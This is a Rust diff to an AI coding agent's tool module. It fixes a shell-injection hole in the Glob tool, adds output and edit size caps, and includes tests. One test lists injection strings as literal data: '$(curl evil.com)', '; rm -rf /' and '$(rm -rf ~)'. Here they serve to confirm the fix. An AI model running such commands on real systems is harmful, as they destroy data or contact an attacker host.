@@ -1,8 +1,9 @@
 use serde_json::{json, Value};
+use std::collections::HashSet;
 use std::io::{BufRead, BufReader};
 use std::path::Path;
 use std::process::{Command, Stdio};
-use std::sync::mpsc;
+use std::sync::{mpsc, OnceLock};
 use std::time::{Duration, Instant};
 
 /// Generate `all_tool_schemas()` from a declarative tool list.
@@ -36,7 +37,7 @@ tools! {
         "required": ["file_path"]
     });
 
-    "Glob", "List files matching a glob pattern. Returns up to 1000 entries sorted by modification time.",
+    "Glob", "List files matching a glob pattern. Returns up to 1000 entries in alphabetical order.",
     json!({
         "type": "object",
         "properties": {
@@ -187,30 +188,69 @@ fn glob_exec(input: &Value) -> Result<String, String> {
         .ok_or("Missing required parameter: pattern")?;
     let base = input["path"].as_str().unwrap_or(".");
 
-    // Shell out to find with glob, or use a simpler approach
-    // Using bash for glob expansion to avoid pulling in the glob crate
     let full_pattern = if pattern.starts_with('/') || pattern.starts_with('.') {
         pattern.to_string()
     } else {
         format!("{base}/{pattern}")
     };
 
-    let output = Command::new("bash")
-        .arg("-c")
-        .arg(format!(
-            "shopt -s globstar nullglob; files=({full_pattern}); printf '%s\\n' \"${{files[@]}}\" | head -1000"
-        ))
-        .output()
-        .map_err(|e| format!("Failed to execute glob: {e}"))?;
+    let expanded = expand_braces(&full_pattern);
 
-    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-    let result = stdout.trim().to_string();
+    let mut seen = HashSet::new();
+    let mut results = Vec::new();
+    const LIMIT: usize = 1000;
 
-    if result.is_empty() {
+    for pat in &expanded {
+        let paths =
+            glob::glob(pat).map_err(|e| format!("Invalid glob pattern '{}': {}", pat, e))?;
+        for entry in paths {
+            if results.len() >= LIMIT {
+                break;
+            }
+            // Skip entries with errors (permission denied, etc.)
+            let path = match entry {
+                Ok(p) => p,
+                Err(_) => continue,
+            };
+            let path_str = path.to_string_lossy().to_string();
+            if seen.insert(path_str.clone()) {
+                results.push(path_str);
+            }
+        }
+        if results.len() >= LIMIT {
+            break;
+        }
+    }
+
+    if results.is_empty() {
         Ok("No files found".to_string())
     } else {
-        Ok(result)
+        Ok(results.join("\n"))
     }
+}
+
+/// Expand a single top-level brace group in a glob pattern.
+/// `**/*.{rs,toml}` → `["**/*.rs", "**/*.toml"]`
+/// `src/{main,lib}.rs` → `["src/main.rs", "src/lib.rs"]`
+/// No braces or unmatched braces → returns the original pattern unchanged.
+fn expand_braces(pattern: &str) -> Vec<String> {
+    let open = match pattern.find('{') {
+        Some(i) => i,
+        None => return vec![pattern.to_string()],
+    };
+    let close = match pattern[open..].find('}') {
+        Some(i) => open + i,
+        None => return vec![pattern.to_string()],
+    };
+
+    let prefix = &pattern[..open];
+    let suffix = &pattern[close + 1..];
+    let alternatives = &pattern[open + 1..close];
+
+    alternatives
+        .split(',')
+        .map(|alt| format!("{prefix}{alt}{suffix}"))
+        .collect()
 }
 
 /// Deny-list patterns for bash commands. Whitespace-normalized lowercase matching.
@@ -240,6 +280,10 @@ fn is_denied_command(cmd: &str) -> bool {
         .iter()
         .any(|pattern| normalized.contains(pattern))
 }
+
+/// Maximum output size for bash commands (1MB). Commands that exceed this are
+/// killed to prevent unbounded memory growth from runaway processes.
+const BASH_OUTPUT_LIMIT: usize = 1_048_576;
 
 fn bash_exec(input: &Value, stream_cb: &mut dyn FnMut(&str)) -> Result<String, String> {
     let command = input["command"]
@@ -310,6 +354,7 @@ fn bash_exec(input: &Value, stream_cb: &mut dyn FnMut(&str)) -> Result<String, S
     // Drop our copy of tx so rx closes when threads finish
     let mut output = String::new();
     let mut timed_out = false;
+    let mut truncated = false;
 
     loop {
         if Instant::now() >= deadline {
@@ -321,6 +366,13 @@ fn bash_exec(input: &Value, stream_cb: &mut dyn FnMut(&str)) -> Result<String, S
         match rx.recv_timeout(Duration::from_millis(50)) {
             Ok(chunk) => {
                 stream_cb(&chunk);
+                if output.len() + chunk.len() > BASH_OUTPUT_LIMIT {
+                    let remaining = BASH_OUTPUT_LIMIT.saturating_sub(output.len());
+                    output.push_str(&chunk[..chunk.floor_char_boundary(remaining)]);
+                    let _ = child.kill();
+                    truncated = true;
+                    break;
+                }
                 output.push_str(&chunk);
             }
             Err(mpsc::RecvTimeoutError::Timeout) => {
@@ -330,7 +382,13 @@ fn bash_exec(input: &Value, stream_cb: &mut dyn FnMut(&str)) -> Result<String, S
                         // Process finished — drain remaining
                         while let Ok(chunk) = rx.try_recv() {
                             stream_cb(&chunk);
-                            output.push_str(&chunk);
+                            if output.len() + chunk.len() <= BASH_OUTPUT_LIMIT {
+                                output.push_str(&chunk);
+                            } else if !truncated {
+                                let remaining = BASH_OUTPUT_LIMIT.saturating_sub(output.len());
+                                output.push_str(&chunk[..chunk.floor_char_boundary(remaining)]);
+                                truncated = true;
+                            }
                         }
                         break;
                     }
@@ -344,6 +402,13 @@ fn bash_exec(input: &Value, stream_cb: &mut dyn FnMut(&str)) -> Result<String, S
                 break;
             }
         }
+    }
+
+    if truncated {
+        let _ = child.wait();
+        return Err(format!(
+            "Command output exceeded 1MB limit (truncated):\n{output}"
+        ));
     }
 
     if timed_out {
@@ -385,9 +450,19 @@ fn edit_exec(input: &Value) -> Result<String, String> {
 
     let path = Path::new(file_path);
 
+    const EDIT_SIZE_LIMIT: u64 = 102_400;
+
     // Empty old_str: create file (if missing) or append (if exists)
     if old_str.is_empty() {
         if path.exists() {
+            let metadata =
+                std::fs::metadata(path).map_err(|e| format!("Cannot read metadata: {e}"))?;
+            if metadata.len() > EDIT_SIZE_LIMIT {
+                return Err(format!(
+                    "File too large for edit: {} bytes (limit: 100KB)",
+                    metadata.len()
+                ));
+            }
             // Append
             let mut content =
                 std::fs::read_to_string(path).map_err(|e| format!("Cannot read file: {e}"))?;
@@ -395,6 +470,12 @@ fn edit_exec(input: &Value) -> Result<String, String> {
             std::fs::write(path, &content).map_err(|e| format!("Cannot write file: {e}"))?;
             return Ok(format!("Appended to {file_path}"));
         } else {
+            if new_str.len() as u64 > EDIT_SIZE_LIMIT {
+                return Err(format!(
+                    "Content too large for create: {} bytes (limit: 100KB)",
+                    new_str.len()
+                ));
+            }
             // Create with parent dirs
             if let Some(parent) = path.parent() {
                 std::fs::create_dir_all(parent)
@@ -409,7 +490,7 @@ fn edit_exec(input: &Value) -> Result<String, String> {
     let content = std::fs::read_to_string(path).map_err(|e| format!("Cannot read file: {e}"))?;
 
     let metadata = std::fs::metadata(path).map_err(|e| format!("Cannot read metadata: {e}"))?;
-    if metadata.len() > 102_400 {
+    if metadata.len() > EDIT_SIZE_LIMIT {
         return Err(format!(
             "File too large for edit: {} bytes (limit: 100KB)",
             metadata.len()
@@ -451,22 +532,20 @@ fn grep_exec(input: &Value) -> Result<String, String> {
     let file_type = input["file_type"].as_str();
     let case_sensitive = input["case_sensitive"].as_bool().unwrap_or(true);
 
-    // Check rg is installed
-    let rg_check = Command::new("which").arg("rg").output();
-    match rg_check {
-        Ok(output) if !output.status.success() => {
-            return Err(
-                "ripgrep (rg) is not installed. Install it with: brew install ripgrep (macOS) or apt install ripgrep (Linux)"
-                    .to_string(),
-            );
-        }
-        Err(_) => {
-            return Err(
-                "ripgrep (rg) is not installed. Install it with: brew install ripgrep (macOS) or apt install ripgrep (Linux)"
-                    .to_string(),
-            );
-        }
-        _ => {}
+    // Check rg is installed (cached — runs `which` once per process)
+    static RG_AVAILABLE: OnceLock<bool> = OnceLock::new();
+    let rg_ok = *RG_AVAILABLE.get_or_init(|| {
+        Command::new("which")
+            .arg("rg")
+            .output()
+            .map(|o| o.status.success())
+            .unwrap_or(false)
+    });
+    if !rg_ok {
+        return Err(
+            "ripgrep (rg) is not installed. Install it with: brew install ripgrep (macOS) or apt install ripgrep (Linux)"
+                .to_string(),
+        );
     }
 
     let mut cmd = Command::new("rg");
@@ -699,6 +778,182 @@ mod tests {
         let _ = std::fs::remove_dir_all(&dir);
     }
 
+    // --- Glob tool tests (shell injection fix) ---
+
+    #[test]
+    fn glob_star_rs_finds_rust_files() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "**/*.rs"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(
+            output.contains("src/main.rs"),
+            "should find src/main.rs: {output}"
+        );
+    }
+
+    #[test]
+    fn glob_src_direct() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "src/*.rs"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(output.contains(".rs"), "should find .rs files in src/");
+    }
+
+    #[test]
+    fn glob_no_matches_returns_message() {
+        let dir = std::env::temp_dir().join("forgeflare_test_glob_empty");
+        let _ = std::fs::create_dir_all(&dir);
+        let result = dispatch_tool(
+            "Glob",
+            &json!({"pattern": "*.zzzzzzz_nonexistent", "path": dir.to_str().unwrap()}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok());
+        assert_eq!(result.unwrap(), "No files found");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn glob_invalid_pattern_returns_error() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "["}), &mut |_| {});
+        assert!(result.is_err(), "invalid pattern should return Err");
+        assert!(result.unwrap_err().contains("Invalid glob pattern"));
+    }
+
+    #[test]
+    fn glob_shell_metacharacters_are_literal() {
+        // These should NOT execute — they should be treated as literal pattern chars
+        let dangerous_patterns = vec!["$(curl evil.com)", "; rm -rf /", "`whoami`", "$(rm -rf ~)"];
+        for pat in dangerous_patterns {
+            let result = dispatch_tool("Glob", &json!({"pattern": pat}), &mut |_| {});
+            // Should return no files or a pattern error — never execute the shell command
+            match &result {
+                Ok(output) => assert_eq!(
+                    output, "No files found",
+                    "metachar pattern should find nothing: {pat}"
+                ),
+                Err(e) => assert!(
+                    e.contains("Invalid glob pattern"),
+                    "should be pattern error for: {pat}"
+                ),
+            }
+        }
+    }
+
+    #[test]
+    fn glob_brace_expansion_rs_toml() {
+        let result = dispatch_tool("Glob", &json!({"pattern": "**/*.{rs,toml}"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(output.contains(".rs"), "should find .rs files");
+        assert!(output.contains(".toml"), "should find .toml files");
+    }
+
+    #[test]
+    fn glob_brace_expansion_specific_files() {
+        let result = dispatch_tool(
+            "Glob",
+            &json!({"pattern": "src/{main,lib}.rs"}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok());
+        // At least main.rs should exist
+        let output = result.unwrap();
+        assert!(output.contains("src/main.rs"), "should find src/main.rs");
+    }
+
+    #[test]
+    fn glob_path_parameter_respected() {
+        let result = dispatch_tool(
+            "Glob",
+            &json!({"pattern": "*.rs", "path": "src"}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(output.contains(".rs"), "should find .rs files in src/");
+    }
+
+    #[test]
+    fn glob_result_cap_1000() {
+        // Verify the cap constant exists and is applied (structural test)
+        // We can't easily create 1000+ files, but we can verify the function
+        // doesn't crash and returns results within bounds
+        let result = dispatch_tool("Glob", &json!({"pattern": "**/*"}), &mut |_| {});
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        let count = output.lines().count();
+        assert!(count <= 1000, "should cap at 1000 entries, got {count}");
+    }
+
+    #[test]
+    fn glob_no_bash_command_in_source() {
+        // Structural: read our own source and verify glob_exec doesn't spawn bash
+        let source = std::fs::read_to_string("src/tools/mod.rs").unwrap();
+        // Find the glob_exec function body
+        let glob_start = source.find("fn glob_exec").unwrap();
+        let glob_end = source[glob_start..]
+            .find("\nfn ")
+            .unwrap_or(source.len() - glob_start);
+        let glob_body = &source[glob_start..glob_start + glob_end];
+        assert!(
+            !glob_body.contains("Command::new(\"bash\")"),
+            "glob_exec must not spawn bash"
+        );
+    }
+
+    // --- expand_braces unit tests ---
+
+    #[test]
+    fn expand_braces_no_braces() {
+        assert_eq!(expand_braces("**/*.rs"), vec!["**/*.rs"]);
+    }
+
+    #[test]
+    fn expand_braces_single_group() {
+        let result = expand_braces("**/*.{rs,toml}");
+        assert_eq!(result, vec!["**/*.rs", "**/*.toml"]);
+    }
+
+    #[test]
+    fn expand_braces_prefix_suffix() {
+        let result = expand_braces("src/{main,lib}.rs");
+        assert_eq!(result, vec!["src/main.rs", "src/lib.rs"]);
+    }
+
+    #[test]
+    fn expand_braces_unmatched_open() {
+        // { without } → pass through unchanged
+        assert_eq!(expand_braces("**/*.{rs"), vec!["**/*.{rs"]);
+    }
+
+    #[test]
+    fn expand_braces_single_alternative() {
+        assert_eq!(expand_braces("**/*.{rs}"), vec!["**/*.rs"]);
+    }
+
+    #[test]
+    fn expand_braces_three_alternatives() {
+        let result = expand_braces("**/*.{rs,toml,md}");
+        assert_eq!(result, vec!["**/*.rs", "**/*.toml", "**/*.md"]);
+    }
+
+    #[test]
+    fn glob_brace_expansion_invalid_pattern_fails_entirely() {
+        // glob-shell-injection R5: if brace expansion produces an invalid pattern,
+        // the entire operation must fail — no partial results returned.
+        // `[` is an invalid glob pattern (unclosed character class).
+        let result = dispatch_tool("Glob", &json!({"pattern": "*.{rs,[}"}), &mut |_| {});
+        assert!(
+            result.is_err(),
+            "brace expansion producing invalid pattern should fail entirely"
+        );
+        assert!(
+            result.unwrap_err().contains("Invalid glob pattern"),
+            "error should mention invalid glob pattern"
+        );
+    }
+
     // --- ToolEffect classification tests ---
 
     #[test]
@@ -738,5 +993,184 @@ mod tests {
                 _ => panic!("New tool {name} needs explicit ToolEffect classification"),
             }
         }
+    }
+
+    // --- bash_exec output cap tests ---
+
+    #[test]
+    fn bash_output_cap_constant_is_1mb() {
+        assert_eq!(BASH_OUTPUT_LIMIT, 1_048_576);
+    }
+
+    #[test]
+    fn bash_large_output_is_truncated() {
+        // Generate ~2MB of output — exceeds the 1MB cap.
+        // Use yes piped through head to produce enough repeated lines.
+        let result = dispatch_tool(
+            "Bash",
+            &json!({"command": "yes 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | head -c 2097152"}),
+            &mut |_| {},
+        );
+        assert!(result.is_err(), "should return Err on output cap");
+        let err = result.unwrap_err();
+        assert!(
+            err.contains("1MB limit"),
+            "error should mention 1MB limit: {}",
+            &err[..err.len().min(200)]
+        );
+    }
+
+    #[test]
+    fn bash_normal_output_not_truncated() {
+        // Small output should pass through fine
+        let result = dispatch_tool("Bash", &json!({"command": "echo hello"}), &mut |_| {});
+        assert!(result.is_ok());
+        assert_eq!(result.unwrap().trim(), "hello");
+    }
+
+    // --- Edit size limit tests (create/append paths) ---
+
+    #[test]
+    fn edit_append_rejects_oversized_file() {
+        let dir = std::env::temp_dir().join("forgeflare_test_edit");
+        let _ = std::fs::create_dir_all(&dir);
+        let file = dir.join("test_oversized_append.txt");
+        // Create a file larger than 100KB
+        let big = "x".repeat(110_000);
+        std::fs::write(&file, &big).unwrap();
+
+        let result = dispatch_tool(
+            "Edit",
+            &json!({
+                "file_path": file.to_str().unwrap(),
+                "old_str": "",
+                "new_str": "more data",
+            }),
+            &mut |_| {},
+        );
+        assert!(result.is_err(), "should reject append to oversized file");
+        assert!(result.unwrap_err().contains("too large"));
+        let _ = std::fs::remove_file(&file);
+    }
+
+    #[test]
+    fn edit_create_rejects_oversized_content() {
+        let dir = std::env::temp_dir().join("forgeflare_test_edit");
+        let _ = std::fs::create_dir_all(&dir);
+        let file = dir.join("test_oversized_create.txt");
+        let _ = std::fs::remove_file(&file);
+
+        let big_content = "x".repeat(110_000);
+        let result = dispatch_tool(
+            "Edit",
+            &json!({
+                "file_path": file.to_str().unwrap(),
+                "old_str": "",
+                "new_str": big_content,
+            }),
+            &mut |_| {},
+        );
+        assert!(result.is_err(), "should reject oversized create");
+        assert!(result.unwrap_err().contains("too large"));
+        // File should not have been created
+        assert!(!file.exists());
+    }
+
+    // --- grep rg cache test ---
+
+    #[test]
+    fn grep_rg_cache_is_consistent() {
+        // Call grep twice — both should succeed (rg is installed on this system)
+        // and the OnceLock should be initialized on first call, reused on second
+        let r1 = dispatch_tool(
+            "Grep",
+            &json!({"pattern": "fn main", "path": "src/main.rs"}),
+            &mut |_| {},
+        );
+        let r2 = dispatch_tool(
+            "Grep",
+            &json!({"pattern": "fn main", "path": "src/main.rs"}),
+            &mut |_| {},
+        );
+        assert!(r1.is_ok(), "first grep should succeed");
+        assert!(r2.is_ok(), "second grep should succeed");
+    }
+
+    #[test]
+    fn edit_replace_all_zero_matches_returns_error() {
+        // replace_all=true with a string that doesn't exist in the file
+        // should return Err, not silently succeed with 0 replacements.
+        let dir = std::env::temp_dir().join("forgeflare_test_edit");
+        let _ = std::fs::create_dir_all(&dir);
+        let file = dir.join("test_replace_all_zero.txt");
+        std::fs::write(&file, "hello world").unwrap();
+
+        let result = dispatch_tool(
+            "Edit",
+            &json!({
+                "file_path": file.to_str().unwrap(),
+                "old_str": "zzz_nonexistent_zzz",
+                "new_str": "replacement",
+                "replace_all": true,
+            }),
+            &mut |_| {},
+        );
+        assert!(result.is_err(), "replace_all with 0 matches should error");
+        assert!(result.unwrap_err().contains("not found"));
+
+        // File should be unchanged
+        let content = std::fs::read_to_string(&file).unwrap();
+        assert_eq!(content, "hello world");
+        let _ = std::fs::remove_file(&file);
+    }
+
+    #[test]
+    fn glob_path_trailing_slash_works() {
+        // path="src/" with trailing slash should work identically to path="src"
+        let result = dispatch_tool(
+            "Glob",
+            &json!({"pattern": "*.rs", "path": "src/"}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok());
+        let output = result.unwrap();
+        assert!(
+            output.contains(".rs"),
+            "should find .rs files with trailing slash path"
+        );
+    }
+
+    #[test]
+    fn read_exactly_1mb_succeeds() {
+        // The guard is `> 1_048_576` (strict greater-than), so exactly 1MB
+        // should be allowed. 1MB + 1 should be rejected.
+        let dir = std::env::temp_dir().join("forgeflare_test_read_boundary");
+        let _ = std::fs::create_dir_all(&dir);
+
+        let file_ok = dir.join("exactly_1mb.txt");
+        let data_ok = "a".repeat(1_048_576);
+        std::fs::write(&file_ok, &data_ok).unwrap();
+
+        let result = dispatch_tool(
+            "Read",
+            &json!({"file_path": file_ok.to_str().unwrap()}),
+            &mut |_| {},
+        );
+        assert!(result.is_ok(), "exactly 1MB should be allowed");
+        assert_eq!(result.unwrap().len(), 1_048_576);
+
+        let file_over = dir.join("over_1mb.txt");
+        let data_over = "a".repeat(1_048_577);
+        std::fs::write(&file_over, &data_over).unwrap();
+
+        let result = dispatch_tool(
+            "Read",
+            &json!({"file_path": file_over.to_str().unwrap()}),
+            &mut |_| {},
+        );
+        assert!(result.is_err(), "1MB + 1 should be rejected");
+        assert!(result.unwrap_err().contains("too large"));
+
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
